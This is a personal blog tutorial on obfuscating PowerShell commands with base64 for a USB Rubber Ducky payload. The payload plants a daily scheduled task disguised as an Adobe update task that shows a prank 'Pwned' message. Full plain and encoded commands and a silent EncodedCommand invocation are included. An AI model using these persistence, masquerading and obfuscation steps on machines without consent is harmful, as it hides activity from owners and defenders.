---
title: Obfuscating PowerShell Commands
date: 2019-06-25T04:34:07+00:00
author: Josh
layout: post
permalink: /obfuscating-powershell-commands/
image: https://joshdawes.com/images/uploads/2019/06/obfuscating-powershell-commands.png
categories:
  - PowerShell
  - Security
tags:
  - RubberDucky
---
I recently wrote a Ducky Script that creates a scheduled task upon plugging a <a rel="noreferrer noopener" aria-label="Rubber Ducky (opens in a new tab)" href="https://shop.hak5.org/products/usb-rubber-ducky-deluxe" target="_blank">Rubber Ducky</a> into an unlocked PC. While the script is successful, I find it gives away too many clues as to what the script is doing.

PowerShell commands can be obfuscated using base64. These commands can be submitted to PowerShell using the the **EncodedCommands** parameter. While designed to be used to submit commands to PowerShell that require complex quotation marks or curly braces, it can also be used in an attempt to hide what commands a script is running.

The PowerShell commands my [Ducky Script](https://joshdawes.com/usb-rubber-ducky/) runs are as follows:

<pre class="wp-block-preformatted">$action = New-ScheduledTaskAction -Execute 'wlrmdr.exe' -Argument " -s 60000 -f 1 -t You've Been Pwned! -m Remember that USB you plugged in? Pepperidge Farm Remembers. -a o"

$trigger = New-ScheduledTaskTrigger -Daily -At 3:14pm

Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Adobe Acrobat Update Tusk" -Description "This task doesn't keep your Adobe Reader and Acrobat applications up to date with the latest enhancements and security fixes"</pre>

This is a benign script that will remind the victim daily that they plugged in an unknown USB stick. I also had the scheduled task _**kind of**_ hide itself as the Adobe Reader Update Task in an attempt to avoid being discovered later on.

Before getting started, PowerShell will need to know that it is to run all these commands together. This can be done using a semicolin (;). Simply put a semicolon between each command like so:

<pre class="wp-block-preformatted">$action = New-ScheduledTaskAction -Execute 'wlrmdr.exe' -Argument " -s 60000 -f 1 -t You've Been Pwned! -m Remember that USB you plugged in? Pepperidge Farm Remembers. -a o";$trigger = New-ScheduledTaskTrigger -Daily -At 3:14pm;Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Adobe Acrobat Update Tusk" -Description "This task doesn't keep your Adobe Reader and Acrobat applications up to date with the latest enhancements and security fixes"</pre>

To convert the commands to base64, add the commands to a variable with a name of your choice. It my case I&#8217;ve gone with **$EncodeText**. It will also be important to use the <a rel="noreferrer noopener" aria-label="backtick (opens in a new tab)" href="https://devblogs.microsoft.com/scripting/weekend-scripter-understanding-quotation-marks-in-powershell/" target="_blank">backtick</a> on the variables and some of the quotations.

<pre class="wp-block-preformatted">$EncodeText = "`$action = New-ScheduledTaskAction -Execute 'wlrmdr.exe' -Argument `" -s 60000 -f 1 -t You've Been Pwned! -m Remember that USB you plugged in? Pepperidge Farm Remembers. -a o`";`$trigger = New-ScheduledTaskTrigger -Daily -At 3:14pm;Register-ScheduledTask -Action `$action -Trigger `$trigger -TaskName `"Adobe Acrobat Update Tusk`" -Description `"This task doesn't keep your Adobe Reader and Acrobat applications up to date with the latest enhancements and security fixes`""</pre>

The commands can now be encoded in base64 by running the following command:

<pre class="wp-block-preformatted">[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($EncodeText))</pre>

The base64 text will be displayed on the screen.

<pre class="wp-block-preformatted">JABhAGMAdABpAG8AbgAgAD0AIABOAGUAdwAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAQQBjAHQAaQBvAG4AIAAtAEUAeABlAGMAdQB0AGUAIAAnAHcAbAByAG0AZAByAC4AZQB4AGUAJwAgAC0AQQByAGcAdQBtAGUAbgB0ACAAIgAgAC0AcwAgADYAMAAwADAAMAAgAC0AZgAgADEAIAAtAHQAIABZAG8AdQAnAHYAZQAgAEIAZQBlAG4AIABQAHcAbgBlAGQAIQAgAC0AbQAgAFIAZQBtAGUAbQBiAGUAcgAgAHQAaABhAHQAIABVAFMAQgAgAHkAbwB1ACAAcABsAHUAZwBnAGUAZAAgAGkAbgA/ACAAUABlAHAAcABlAHIAaQBkAGcAZQAgAEYAYQByAG0AIABSAGUAbQBlAG0AYgBlAHIAcwAuACAALQBhACAAbwAiADsAJAB0AHIAaQBnAGcAZQByACAAPQAgAE4AZQB3AC0AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBUAHIAaQBnAGcAZQByACAALQBEAGEAaQBsAHkAIAAtAEEAdAAgADMAOgAxADQAcABtADsAUgBlAGcAaQBzAHQAZQByAC0AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawAgAC0AQQBjAHQAaQBvAG4AIAAkAGEAYwB0AGkAbwBuACAALQBUAHIAaQBnAGcAZQByACAAJAB0AHIAaQBnAGcAZQByACAALQBUAGEAcwBrAE4AYQBtAGUAIAAiAEEAZABvAGIAZQAgAEEAYwByAG8AYgBhAHQAIABVAHAAZABhAHQAZQAgAFQAdQBzAGsAIgAgAC0ARABlAHMAYwByAGkAcAB0AGkAbwBuACAAIgBUAGgAaQBzACAAdABhAHMAawAgAGQAbwBlAHMAbgAnAHQAIABrAGUAZQBwACAAeQBvAHUAcgAgAEEAZABvAGIAZQAgAFIAZQBhAGQAZQByACAAYQBuAGQAIABBAGMAcgBvAGIAYQB0ACAAYQBwAHAAbABpAGMAYQB0AGkAbwBuAHMAIAB1AHAAIAB0AG8AIABkAGEAdABlACAAdwBpAHQAaAAgAHQAaABlACAAbABhAHQAZQBzAHQAIABlAG4AaABhAG4AYwBlAG0AZQBuAHQAcwAgAGEAbgBkACAAcwBlAGMAdQByAGkAdAB5ACAAZgBpAHgAZQBzACIA</pre>

This can now be fed into PowerShell using the EncodedCommand parameter. You can pipe the command to **Out-Null** to have the command run without any output:

<pre class="wp-block-preformatted">PowerShell -EncodedCommand JABhAGMAdABpAG8AbgAgAD0AIABOAGUAdwAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAQQBjAHQAaQBvAG4AIAAtAEUAeABlAGMAdQB0AGUAIAAnAHcAbAByAG0AZAByAC4AZQB4AGUAJwAgAC0AQQByAGcAdQBtAGUAbgB0ACAAIgAgAC0AcwAgADYAMAAwADAAMAAgAC0AZgAgADEAIAAtAHQAIABZAG8AdQAnAHYAZQAgAEIAZQBlAG4AIABQAHcAbgBlAGQAIQAgAC0AbQAgAFIAZQBtAGUAbQBiAGUAcgAgAHQAaABhAHQAIABVAFMAQgAgAHkAbwB1ACAAcABsAHUAZwBnAGUAZAAgAGkAbgA/ACAAUABlAHAAcABlAHIAaQBkAGcAZQAgAEYAYQByAG0AIABSAGUAbQBlAG0AYgBlAHIAcwAuACAALQBhACAAbwAiADsAJAB0AHIAaQBnAGcAZQByACAAPQAgAE4AZQB3AC0AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBUAHIAaQBnAGcAZQByACAALQBEAGEAaQBsAHkAIAAtAEEAdAAgADMAOgAxADQAcABtADsAUgBlAGcAaQBzAHQAZQByAC0AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawAgAC0AQQBjAHQAaQBvAG4AIAAkAGEAYwB0AGkAbwBuACAALQBUAHIAaQBnAGcAZQByACAAJAB0AHIAaQBnAGcAZQByACAALQBUAGEAcwBrAE4AYQBtAGUAIAAiAEEAZABvAGIAZQAgAEEAYwByAG8AYgBhAHQAIABVAHAAZABhAHQAZQAgAFQAdQBzAGsAIgAgAC0ARABlAHMAYwByAGkAcAB0AGkAbwBuACAAIgBUAGgAaQBzACAAdABhAHMAawAgAGQAbwBlAHMAbgAnAHQAIABrAGUAZQBwACAAeQBvAHUAcgAgAEEAZABvAGIAZQAgAFIAZQBhAGQAZQByACAAYQBuAGQAIABBAGMAcgBvAGIAYQB0ACAAYQBwAHAAbABpAGMAYQB0AGkAbwBuAHMAIAB1AHAAIAB0AG8AIABkAGEAdABlACAAdwBpAHQAaAAgAHQAaABlACAAbABhAHQAZQBzAHQAIABlAG4AaABhAG4AYwBlAG0AZQBuAHQAcwAgAGEAbgBkACAAcwBlAGMAdQByAGkAdAB5ACAAZgBpAHgAZQBzACIA | Out-Null</pre>

You can now run Obfuscated PowerShell Commands the way your inner PowerShell Ninja intended.

Check out the <a rel="noreferrer noopener" aria-label="Check out the Ducky Script on GitHub! (opens in a new tab)" href="https://github.com/0x6A6F7368/PowerShellScheduledTaskv2" target="_blank">Ducky Script on GitHub!</a>
